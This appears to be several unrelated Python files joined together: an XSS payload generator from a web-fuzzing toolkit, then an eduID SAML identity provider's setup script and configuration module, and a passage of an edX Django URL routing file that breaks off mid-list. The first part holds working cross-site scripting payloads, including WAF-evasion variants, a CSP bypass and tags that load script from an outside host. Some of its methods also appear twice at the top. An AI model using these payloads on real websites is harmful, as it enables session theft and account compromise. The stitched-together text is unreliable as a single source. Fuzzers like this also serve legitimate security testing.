    def script(self):
        payload = "<script src='%s'></script>" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = "<%s src=" % element
        payload += '"%s" ' % src
        payload += event
        payload += "=%s >" % js
        return payload

    def cspBypass(self):
        return "<link rel='preload' href='%s'>" % self.url

#!/usr/bin/env python
# -*- coding: utf-8 -*-

from saker.fuzzers.fuzzer import Fuzzer

_tags = [
    'a',
    'abbr',
    'acronym',
    'address',
    'applet',
    'area',
    'article',
    'aside',
    'audio',
    'b',
    'base',
    'basefont',
    'bdi',
    'bdo',
    'bgsound',
    'big',
    'blink',
    'blockquote',
    'body',
    'br',
    'button',
    'canvas',
    'caption',
    'center',
    'cite',
    'code',
    'col',
    'colgroup',
    'command',
    'content',
    'data',
    'datalist',
    'dd',
    'del',
    'details',
    'dfn',
    'dialog',
    'dir',
    'div',
    'dl',
    'dt',
    'element',
    'em',
    'embed',
    'fieldset',
    'figcaption',
    'figure',
    'font',
    'footer',
    'form',
    'frame',
    'frameset',
    'h1',
    'h2',
    'h3',
    'h4',
    'h5',
    'h6',
    'head',
    'header',
    'hgroup',
    'hr',
    'html',
    'i',
    'iframe',
    'image',
    'img',
    'input',
    'ins',
    'isindex',
    'kbd',
    'keygen',
    'label',
    'layer',
    'legend',
    'li',
    'link',
    'listing',
    'main',
    'map',
    'mark',
    'marquee',
    'menu',
    'menuitem',
    'meta',
    'meter',
    'multicol',
    'nav',
    'nobr',
    'noembed',
    'noframes',
    'nolayer',
    'noscript',
    'object',
    'ol',
    'optgroup',
    'option',
    'output',
    'p',
    'param',
    'picture',
    # 'plaintext',
    'pre',
    'progress',
    'q',
    'rp',
    'rt',
    'rtc',
    'ruby',
    's',
    'samp',
    'script',
    'section',
    'select',
    'shadow',
    'small',
    'source',
    'spacer',
    'span',
    'strike',
    'strong',
    'style',
    'sub',
    'summary',
    'sup',
    'table',
    'tbody',
    'td',
    'template',
    'textarea',
    'tfoot',
    'th',
    'thead',
    'time',
    'title',
    'tr',
    'track',
    'tt',
    'u',
    'ul',
    'var',
    'video',
    'wbr',
    'xmp',
]

_events = [
    'onabort',
    'onautocomplete',
    'onautocompleteerror',
    'onafterscriptexecute',
    'onanimationend',
    'onanimationiteration',
    'onanimationstart',
    'onbeforecopy',
    'onbeforecut',
    'onbeforeload',
    'onbeforepaste',
    'onbeforescriptexecute',
    'onbeforeunload',
    'onbegin',
    'onblur',
    'oncanplay',
    'oncanplaythrough',
    'onchange',
    'onclick',
    'oncontextmenu',
    'oncopy',
    'oncut',
    'ondblclick',
    'ondrag',
    'ondragend',
    'ondragenter',
    'ondragleave',
    'ondragover',
    'ondragstart',
    'ondrop',
    'ondurationchange',
    'onend',
    'onemptied',
    'onended',
    'onerror',
    'onfocus',
    'onfocusin',
    'onfocusout',
    'onhashchange',
    'oninput',
    'oninvalid',
    'onkeydown',
    'onkeypress',
    'onkeyup',
    'onload',
    'onloadeddata',
    'onloadedmetadata',
    'onloadstart',
    'onmessage',
    'onmousedown',
    'onmouseenter',
    'onmouseleave',
    'onmousemove',
    'onmouseout',
    'onmouseover',
    'onmouseup',
    'onmousewheel',
    'onoffline',
    'ononline',
    'onorientationchange',
    'onpagehide',
    'onpageshow',
    'onpaste',
    'onpause',
    'onplay',
    'onplaying',
    'onpopstate',
    'onprogress',
    'onratechange',
    'onreset',
    'onresize',
    'onscroll',
    'onsearch',
    'onseeked',
    'onseeking',
    'onselect',
    'onselectionchange',
    'onselectstart',
    'onstalled',
    'onstorage',
    'onsubmit',
    'onsuspend',
    'ontimeupdate',
    'ontoggle',
    'ontouchcancel',
    'ontouchend',
    'ontouchmove',
    'ontouchstart',
    'ontransitionend',
    'onunload',
    'onvolumechange',
    'onwaiting',
    'onwebkitanimationend',
    'onwebkitanimationiteration',
    'onwebkitanimationstart',
    'onwebkitfullscreenchange',
    'onwebkitfullscreenerror',
    'onwebkitkeyadded',
    'onwebkitkeyerror',
    'onwebkitkeymessage',
    'onwebkitneedkey',
    'onwebkitsourceclose',
    'onwebkitsourceended',
    'onwebkitsourceopen',
    'onwebkitspeechchange',
    'onwebkittransitionend',
    'onwheel'
]

_htmlTemplate = '''
<!DOCTYPE html>
<html>
<head>
    <title>XSS Fuzzer</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
</head>
<body>
%s
</body>
</html>
'''

# probe for test xss vuln
_probes = [
    """'';!--"<XSS>=&{()}""",
]

# xss payloads
_payloads = [
    '<q/oncut=open()>',
    '<svg/onload=eval(name)>',
    '<svg/onload=eval(window.name)>',
    '<svg/onload=eval(location.hash.slice(1))>',
    '<img src=x onerror=alert(/xss/)>',
    """<img src="javascript:alert('xss');">""",
    """<style>@im\\port'\\ja\\vasc\\ript:alert("xss")';</style>""",
    """<img style="xss:expr/*xss*/ession(alert('xss'))"> """,
    """<meta http-equiv="refresh" content="0;url=javascript:alert('xss');">""",
    """<meta http-equiv="refresh" content="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">""",
    """<head><meta http-equiv="content-type" content="text/html; charset=utf-7"> </head>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-"""
]

# payload for waf test
_waf_payloads = [
    "<IMG SRC=JaVaScRiPt:alert('xss')>",
    '<<script>alert("xss");//<</script>',
    """<img src="javascript:alert('xss')" """,
    '<a href="javascript%26colon;alert(1)">click',
    '<a href=javas&#99;ript:alert(1)>click',
    '<--`<img/src=` onerror=confirm``> --!>',
    '\'"</Script><Html Onmouseover=(confirm)()//'
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//t.cn>',
    '<embed//sRc=//t.cn>',
    '<base href=//t.cn/><script src=/>',
    '<object//data=//t.cn>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'"><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>',
    '<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>',
    '<scriscriptpt>alert(/xss/)</scriscriptpt>',
    '¼script¾alert(¢XSS¢)¼/script¾'
]

# payload with html 5 features
# http://html5sec.org
_h5payloads = [
    '<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>',
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus><input autofocus>',
    '<body onscroll=alert(1)>' + '<br>' * 100 + '<input autofocus>',
    '<video><source onerror="alert(1)">',
    '<video onerror="alert(1)"><source></source></video>',
    '<form><button formaction="javascript:alert(1)">X</button>',
    '<math href="javascript:alert(1)">CLICKME</math>',
    '<link rel="import" href="test.svg" />',
    '<iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />',
]


class XSS(Fuzzer):

    """generate XSS payload"""

    tags = _tags
    events = _events
    htmlTemplate = _htmlTemplate
    probes = _probes
    payloads = _payloads
    waf_payloads = _waf_payloads
    h5payloads = _h5payloads

    def __init__(self, url=""):
        """
        url: xss payload url
        """
        super(XSS, self).__init__()
        self.url = url

    @classmethod
    def alterTest(cls, p=False):
        return "<script>alert(/xss/)</script>"

    @classmethod
    def genTestHTML(cls):
        s = ''
        for t in cls.tags:
            s += '<%s src="x"' % t
            for e in cls.events:
                s += ''' %s="console.log('%s %s')" ''' % (e, t, e)
            s += '>%s</%s>\n' % (t, t)
        return cls.htmlTemplate % s

    @classmethod
    def acmehttp01(cls, url):
        # https://labs.detectify.com/2018/09/04/xss-using-quirky-implementations-of-acme-http-01/
        return url + '/.well-known/acme-challenge/?<h1>hi'

    def img(self, payload):                    
        return '<img/onerror="%s"/src=x>' % payload

    def svg(self, payload):
        return '<svg/onload="%s"/>' % payload

    def style(self, payload):
        return '<style/onload="%s"></style>' % payload

    def input(self, payload):
        return '<input/onfocus="%s"/autofocus>' % payload

    def marquee(self, payload):
        return '<marquee/onstart="%s"></marquee>' % payload

    def div(self, payload):
        return '<div/onwheel="%s"/style="height:200%;width:100%"></div>' % payload

    def script(self):
        payload = "<script src='%s'></script>" % self.url
        return payload

    def event(self, element, src, event, js):
        payload = "<%s src=" % element
        payload += '"%s" ' % src
        payload += event
        payload += "=%s >" % js
        return payload

    def cspBypass(self):
        return "<link rel='preload' href='%s'>" % self.url

#!/usr/bin/env python
#
from setuptools import setup, find_packages
import sys, os
from distutils import versionpredicate

here = os.path.abspath(os.path.dirname(__file__))
README = open(os.path.join(here, 'README')).read()

version = '0.3.22'                    

install_requires = [
    'pymongo>=2.8,<3',
    'pysaml2==1.2.0beta5',
    'python-memcached==1.53',
    'cherrypy==3.2.4',
    'vccs_client==0.4.1',
    'eduid_am>=0.5.3',
]

testing_extras = [
    'nose==1.2.1',
    'coverage==3.6',
]

setup(name='eduid_idp',
      version=version,
      description="eduID SAML frontend IdP",
      long_description=README,
      classifiers=[
        # Get strings from http://pypi.python.org/pypi?%3Aaction=list_classifiers
        ],
      keywords='eduID SAML',
      author='Fredrik Thulin',
      author_email='fredrik@thulin.net',
      license='BSD',
      packages=['eduid_idp',],
      package_dir = {'': 'src'},
      #include_package_data=True,
      #package_data = { },
      zip_safe=False,
      install_requires=install_requires,
      extras_require={
        'testing': testing_extras,
        },
      entry_points={
        'console_scripts': ['eduid_idp=eduid_idp.idp:main',
                            ]
        }
      )

#
# Copyright (c) 2013, 2014 NORDUnet A/S
# All rights reserved.
#
#   Redistribution and use in source and binary forms, with or
#   without modification, are permitted provided that the following
#   conditions are met:
#
#     1. Redistributions of source code must retain the above copyright
#        notice, this list of conditions and the following disclaimer.
#     2. Redistributions in binary form must reproduce the above
#        copyright notice, this list of conditions and the following
#        disclaimer in the documentation and/or other materials provided
#        with the distribution.
#     3. Neither the name of the NORDUnet nor the names of its
#        contributors may be used to endorse or promote products derived
#        from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
# FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
# BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
# LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
# ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
#
# Author : Fredrik Thulin <fredrik@thulin.net>
#
"""
Configuration (file) handling for eduID IdP.
"""

import os
import ConfigParser

_CONFIG_DEFAULTS = {'debug': False,  # overwritten in IdPConfig.__init__()
                    'syslog_debug': '0',              # '1' for True, '0' for False
                    'num_threads': '8',
                    'logdir': None,
                    'logfile': None,
                    'syslog_socket': None,            # syslog socket to log to (/dev/log maybe)
                    'listen_addr': '0.0.0.0',
                    'listen_port': '8088',
                    'pysaml2_config': 'idp_conf.py',  # path prepended in IdPConfig.__init__()
                    'fticks_secret_key': None,
                    'fticks_format_string': 'F-TICKS/SWAMID/2.0#TS={ts}#RP={rp}#AP={ap}#PN={pn}#AM={am}#',
                    'static_dir': None,
                    'ssl_adapter': 'builtin',  # one of cherrypy.wsgiserver.ssl_adapters
                    'server_cert': None,  # SSL cert filename
                    'server_key': None,   # SSL key filename
                    'cert_chain': None,   # SSL certificate chain filename, or None
                    'userdb_mongo_uri': None,
                    'userdb_mongo_database': None,
                    'sso_session_lifetime': '15',  # Lifetime of SSO session in minutes
                    'sso_session_mongo_uri': None,
                    'raven_dsn': None,
                    'content_packages': [],  # List of Python packages ("name:path") with content resources
                    'verify_request_signatures': '0',  # '1' for True, '0' for False
                    'status_test_usernames': [],
                    'signup_link': '#',  # for login.html                    
                    'dashboard_link': '#',  # for forbidden.html
                    'password_reset_link': '#',  # for login.html
                    'default_language': 'en',
                    'base_url': None,
                    'default_eppn_scope': None,
                    'authn_info_mongo_uri': None,
                    'max_authn_failures_per_month': '50',  # Kantara 30-day bad authn limit is 100
                    'login_state_ttl': '5',   # time to complete an IdP login, in minutes
                    'default_scoped_affiliation': None,
                    'vccs_url': 'http://localhost:8550/',    # VCCS backend URL
                    'insecure_cookies': '0',                     # Set to 1 to not set HTTP Cookie 'secure' flag
                    }

_CONFIG_SECTION = 'eduid_idp'


class IdPConfig(object):

    """
    Class holding IdP application configuration.

    Loads configuration from an INI-file at instantiation.

    :param filename: string, INI-file name
    :param debug: boolean, default debug value
    :raise ValueError: if INI-file can't be parsed
    """

    def __init__(self, filename, debug):
        self._parsed_content_packages = None
        self._parsed_status_test_usernames = None
        self.section = _CONFIG_SECTION
        _CONFIG_DEFAULTS['debug'] = str(debug)
        cfgdir = os.path.dirname(filename)
        _CONFIG_DEFAULTS['pysaml2_config'] = os.path.join(cfgdir, _CONFIG_DEFAULTS['pysaml2_config'])
        self.config = ConfigParser.ConfigParser(_CONFIG_DEFAULTS)
        if not self.config.read([filename]):
            raise ValueError("Failed loading config file {!r}".format(filename))

    @property
    def num_threads(self):
        """
        Number of worker threads to start (integer).

        EduID IdP spawns multiple threads to make use of all CPU cores in the password
        pre-hash function.
        Number of threads should probably be about 2x number of cores to 4x number of
        cores (if hyperthreading is available).
        """
        return self.config.getint(self.section, 'num_threads')

    @property
    def logdir(self):
        """
        Path to CherryPy logfiles (string). Something like '/var/log/idp' maybe.
        """
        res = self.config.get(self.section, 'logdir')
        if not res:
            res = None
        return res

    @property
    def logfile(self):
        """
        Path to application logfile. Something like '/var/log/idp/eduid_idp.log' maybe.
        """
        res = self.config.get(self.section, 'logfile')
        if not res:
            res = None
        return res

    @property
    def syslog_socket(self):
        """
        Syslog socket to log to (string). Something like '/dev/log' maybe.
        """
        res = self.config.get(self.section, 'syslog_socket')
        if not res:
            res = None
        return res

    @property
    def debug(self):
        """
        Set to True to log debug messages (boolean).
        """
        return self.config.getboolean(self.section, 'debug')

    @property
    def syslog_debug(self):
        """
        Set to True to log debug messages to syslog (also requires syslog_socket) (boolean).
        """
        return self.config.getboolean(self.section, 'syslog_debug')

    @property
    def listen_addr(self):
        """
        IP address to listen on.
        """
        return self.config.get(self.section, 'listen_addr')

    @property
    def listen_port(self):
        """
        The port the IdP authentication should listen on (integer).
        """
        return self.config.getint(self.section, 'listen_port')

    @property
    def pysaml2_config(self):
        """
        pysaml2 configuration file. Separate config file with SAML related parameters.
        """
        return self.config.get(self.section, 'pysaml2_config')

    @property
    def fticks_secret_key(self):
        """
        SAML F-TICKS user anonymization key. If this is set, the IdP will log FTICKS data
        on every login.
        """
        return self.config.get(self.section, 'fticks_secret_key')

    @property
    def fticks_format_string(self):
        """
        Get SAML F-TICKS format string.
        """
        return self.config.get(self.section, 'fticks_format_string')

    @property
    def static_dir(self):
        """
        Directory with static files to be served.
        """
        return self.config.get(self.section, 'static_dir')

    @property
    def ssl_adapter(self):
        """
        CherryPy SSL adapter class to use (must be one of cherrypy.wsgiserver.ssl_adapters)
        """
        return self.config.get(self.section, 'ssl_adapter')

    @property
    def server_cert(self):
        """
        SSL certificate filename (None == SSL disabled)
        """
        return self.config.get(self.section, 'server_cert')

    @property
    def server_key(self):
        """
        SSL private key filename (None == SSL disabled)
        """
        return self.config.get(self.section, 'server_key')

    @property
    def cert_chain(self):
        """
        SSL certificate chain filename
        """
        return self.config.get(self.section, 'cert_chain')

    @property
    def userdb_mongo_uri(self):
        """
        UserDB MongoDB connection URI (string). See MongoDB documentation for details.
        """
        return self.config.get(self.section, 'userdb_mongo_uri')

    @property
    def userdb_mongo_database(self):
        """
        UserDB database name.
        """
        return self.config.get(self.section, 'userdb_mongo_database')

    @property
    def sso_session_lifetime(self):
        """
        Lifetime of SSO session (in minutes).

        If a user has an active SSO session, they will get SAML assertions made
        without having to authenticate again (unless SP requires it through
        ForceAuthn).

        The total time a user can access a particular SP would therefor be
        this value, plus the pysaml2 lifetime of the assertion.
        """
        return self.config.getint(self.section, 'sso_session_lifetime')

    @property
    def sso_session_mongo_uri(self):
        """
        SSO session MongoDB connection URI (string). See MongoDB documentation for details.

        If not set, an in-memory SSO session cache will be used.
        """
        return self.config.get(self.section, 'sso_session_mongo_uri')

    @property
    def raven_dsn(self):
        """
        Raven DSN (string) for logging exceptions to Sentry.
        """
        return self.config.get(self.section, 'raven_dsn')

    @property
    def content_packages(self):
        """
        Get list of tuples with packages and paths to content resources, such as login.html.

        The expected format in the INI file is

            content_packages = pkg1:some/path/, pkg2:foo

        :return: list of (pkg, path) tuples
        """
        if self._parsed_content_packages:
            return self._parsed_content_packages
        value = self.config.get(self.section, 'content_packages')
        res = []
        for this in value.split(','):
            this = this.strip()
            name, _sep, path, = this.partition(':')
            res.append((name, path))
        self._parsed_content_packages = res
        return res

    @property
    def verify_request_signatures(self):
        """
        Verify request signatures, if they exist.

        This defaults to False since it is a trivial DoS to consume all the IdP:s
        CPU resources if this is set to True.
        """
        res = self.config.get(self.section, 'verify_request_signatures')
        return bool(int(res))

    @property
    def status_test_usernames(self):
        """
        Get list of usernames valid for use with the /status URL.

        If this list is ['*'], all usernames are allowed for /status.

        :return: list of usernames

        :rtype: list[string]
        """
        if self._parsed_status_test_usernames:
            return self._parsed_status_test_usernames
        value = self.config.get(self.section, 'status_test_usernames')
        res = [x.strip() for x in value.split(',')]
        self._parsed_status_test_usernames = res
        return res

    @property
    def signup_link(self):
        """
        URL (string) for use in simple templating of login.html.
        """
        return self.config.get(self.section, 'signup_link')

    @property
    def dashboard_link(self):
        """
        URL (string) for use in simple templating of forbidden.html.
        """
        return self.config.get(self.section, 'dashboard_link')

    @property
    def password_reset_link(self):
        """
        URL (string) for use in simple templating of login.html.
        """
        return self.config.get(self.section, 'password_reset_link')

    @property
    def default_language(self):
        """
        Default language code to use when looking for web pages ('en').
        """
        return self.config.get(self.section, 'default_language')

    @property
    def base_url(self):
        """
        Base URL of the IdP. The default base URL is constructed from the
        Request URI, but for example if there is a load balancer/SSL
        terminator in front of the IdP it might be required to specify
        the URL of the service.
        """
        return self.config.get(self.section, 'base_url')

    @property
    def default_eppn_scope(self):
        """
        The scope to append to any unscoped eduPersonPrincipalName
        attributes found on users in the userdb.
        """
        return self.config.get(self.section, 'default_eppn_scope')

    @property
    def authn_info_mongo_uri(self):
        """
        Authn info (failed logins etc.) MongoDB connection URI (string).
        See MongoDB documentation for details.

        If not set, Kantara authn logs will not be maintained.
        """
        return self.config.get(self.section, 'authn_info_mongo_uri')

    @property
    def max_authn_failures_per_month(self):
        """
        Disallow login for a user after N failures in a given month.

        This is said to be an imminent Kantara requirement.
        """
        return self.config.getint(self.section, 'max_authn_failures_per_month')

    @property
    def login_state_ttl(self):
        """
        Lifetime of state kept in IdP login phase.

        This is the time, in minutes, a user has to complete the login phase.
        After this time, login cannot complete because the SAMLRequest, RelayState
        and possibly other needed information will be forgotten.
        """
        return self.config.getint(self.section, 'login_state_ttl')

    @property
    def default_scoped_affiliation(self):
        """
        Add a default eduPersonScopedAffiliation if none is returned from the
        attribute manager.
        """
        return self.config.get(self.section, 'default_scoped_affiliation')

    @property
    def vccs_url(self):
        """
        URL to use with VCCS client. BCP is to have an nginx or similar on
        localhost that will proxy requests to a currently available backend
        using TLS.
        """
        return self.config.get(self.section, 'vccs_url')

    @property
    def insecure_cookies(self):
        """
        Set to True to NOT set HTTP Cookie 'secure' flag (boolean).
        """
        return self.config.getboolean(self.section, 'insecure_cookies')

from django.conf import settings
from django.conf.urls import patterns, include, url
from django.contrib import admin
from django.conf.urls.static import static

# Not used, the work is done in the imported module.
from . import one_time_startup      # pylint: disable=W0611

import django.contrib.auth.views

# Uncomment the next two lines to enable the admin:
if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'):
    admin.autodiscover()

urlpatterns = ('',  # nopep8
    # certificate view

    url(r'^update_certificate$', 'certificates.views.update_certificate'),
    url(r'^$', 'branding.views.index', name="root"),   # Main marketing page, or redirect to courseware
    url(r'^dashboard$', 'student.views.dashboard', name="dashboard"),
    url(r'^login$', 'student.views.signin_user', name="signin_user"),
    url(r'^register$', 'student.views.register_user', name="register_user"),

    url(r'^admin_dashboard$', 'dashboard.views.dashboard'),

    url(r'^change_email$', 'student.views.change_email_request', name="change_email"),
    url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'),
    url(r'^change_name$', 'student.views.change_name_request', name="change_name"),
    url(r'^accept_name_change$', 'student.views.accept_name_change'),
    url(r'^reject_name_change$', 'student.views.reject_name_change'),
    url(r'^pending_name_changes$', 'student.views.pending_name_changes'),
    url(r'^event$', 'track.views.user_track'),
    url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'),   # TODO: Is this used anymore? What is STATIC_GRAB?

    url(r'^accounts/login$', 'student.views.accounts_login', name="accounts_login"),

    url(r'^login_ajax$', 'student.views.login_user', name="login"),
    url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'),
    url(r'^logout$', 'student.views.logout_user', name='logout'),
    url(r'^create_account$', 'student.views.create_account'),
    url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name="activate"),

    url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name="begin_exam_registration"),
    url(r'^create_exam_registration$', 'student.views.create_exam_registration'),

    url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'),
    ## Obsolete Django views for password resets
    ## TODO: Replace with Mako-ized views
    url(r'^password_change/$', django.contrib.auth.views.password_change,
        name='auth_password_change'),
    url(r'^password_change_done/$', django.contrib.auth.views.password_change_done,
        name='auth_password_change_done'),
    url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$',
        'student.views.password_reset_confirm_wrapper',
        name='auth_password_reset_confirm'),
    url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete,
        name='auth_password_reset_complete'),
    url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done,
        name='auth_password_reset_done'),

    url(r'^heartbeat$', include('heartbeat.urls')),
)

# University profiles only make sense in the default edX context
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        ##
        ## Only universities without courses should be included here.  If
        ## courses exist, the dynamic profile rule below should win.
        ##
        url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'WellesleyX'}),
        url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'McGillX'}),
        url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'TorontoX'}),
        url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'RiceX'}),
        url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'ANUx'}),
        url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile',
            name="static_university_profile", kwargs={'org_id': 'EPFLx'}),

        url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile',
            name="university_profile"),
    )

#Semi-static views (these need to be rendered and have the login bar, but don't change)
urlpatterns += (
    url(r'^404$', 'static_template_view.views.render',
        {'template': '404.html'}, name="404"),
)

# Semi-static views only used by edX, not by themes
if not settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
    urlpatterns += (
        url(r'^jobs$', 'static_template_view.views.render',
            {'template': 'jobs.html'}, name="jobs"),
        url(r'^press$', 'student.views.press', name="press"),
        url(r'^media-kit$', 'static_template_view.views.render',
            {'template': 'media-kit.html'}, name="media-kit"),
        url(r'^faq$', 'static_template_view.views.render',
            {'template': 'faq.html'}, name="faq_edx"),
        url(r'^help$', 'static_template_view.views.render',
            {'template': 'help.html'}, name="help_edx"),

        # TODO: (bridger) The copyright has been removed until it is updated for edX
        # url(r'^copyright$', 'static_template_view.views.render',
        #     {'template': 'copyright.html'}, name="copyright"),

        #Press releases
        url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'),

        # Favicon
        (r'^favicon\.ico$', 'django.views.generic.simple.redirect_to', {'url': '/static/images/favicon.ico'}),

        url(r'^submit_feedback$', 'util.views.submit_feedback'),

    )

# Only enable URLs for those marketing links actually enabled in the
# settings. Disable URLs by marking them as None.
for key, value in settings.MKTG_URL_LINK_MAP.items():
    # Skip disabled URLs
    if value is None:
        continue

    # These urls are enabled separately
    if key == "ROOT" or key == "COURSES" or key == "FAQ":
        continue

    # Make the assumptions that the templates are all in the same dir
    # and that they all match the name of the key (plus extension)
    template = "%s.html" % key.lower()

    # To allow theme templates to inherit from default templates,
    # prepend a standard prefix
    if settings.MITX_FEATURES["USE_CUSTOM_THEME"]:
        template = "theme-" + template

    # Make the assumption that the URL we want is the lowercased
    # version of the map key
    urlpatterns += (url(r'^%s' % key.lower(),
                        'static_template_view.views.render',
                        {'template': template}, name=value),)


if settings.PERFSTATS:
    urlpatterns += (url(r'^reprofile$', 'perfstats.views.end_profile'),)

# Multicourse wiki (Note: wiki urls must be above the courseware ones because of
# the custom tab catch-all)
if settings.WIKI_ENABLED:
    from wiki.urls import get_pattern as wiki_pattern
    from django_notify.urls import get_pattern as notify_pattern

    # Note that some of these urls are repeated in course_wiki.course_nav. Make sure to update
    # them together.
    urlpatterns += (
        # First we include views from course_wiki that we use to override the default views.
        # They come first in the urlpatterns so they get resolved first
        url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'),
        url(r'^wiki/', include(wiki_pattern())),
        url(r'^notify/', include(notify_pattern())),

        # These urls are for viewing the wiki in the context of a course. They should
        # never be returned by a reverse() so they come after the other url patterns
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$',
            'course_wiki.views.course_wiki_redirect', name="course_wiki"),
        url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())),
    )


if settings.COURSEWARE_ENABLED:
    urlpatterns += (
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$',
            'courseware.views.jump_to', name="jump_to"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.modx_dispatch',
            name='modx_dispatch'),


        # Software Licenses

        # TODO: for now, this is the endpoint of an ajax replay
        # service that retrieve and assigns license numbers for
        # software assigned to a course. The numbers have to be loaded
        # into the database.
        url(r'^software-licenses$', 'licenses.views.user_software_license', name="user_software_license"),

        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$',
            'courseware.module_render.xqueue_callback',
            name='xqueue_callback'),
        url(r'^change_setting$', 'student.views.change_setting',
            name='change_setting'),

        # TODO: These views need to be updated before they work
        url(r'^calculate$', 'util.views.calculate'),
        # TODO: We should probably remove the circuit package. I believe it was only used in the old way of saving wiki circuits for the wiki
        # url(r'^edit_circuit/(?P<circuit>[^/]*)$', 'circuit.views.edit_circuit'),
        # url(r'^save_circuit/(?P<circuit>[^/]*)$', 'circuit.views.save_circuit'),

        url(r'^courses/?$', 'branding.views.courses', name="courses"),
        url(r'^change_enrollment$',
            'student.views.change_enrollment', name="change_enrollment"),

        #About the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$',
            'courseware.views.course_about', name="about_course"),
        #View for mktg site (kept for backwards compatibility TODO - remove before merge to master)
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),
        #View for mktg site
        url(r'^mktg/(?P<course_id>.*)$',
            'courseware.views.mktg_course_about', name="mktg_about_course"),



        #Inside the course
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$',
            'courseware.views.course_info', name="course_root"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$',
            'courseware.views.course_info', name="info"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',
            'courseware.views.syllabus', name="syllabus"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',                    
            'staticbook.views.index', name="book"),
        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',                    
            'staticbook.views.index'),
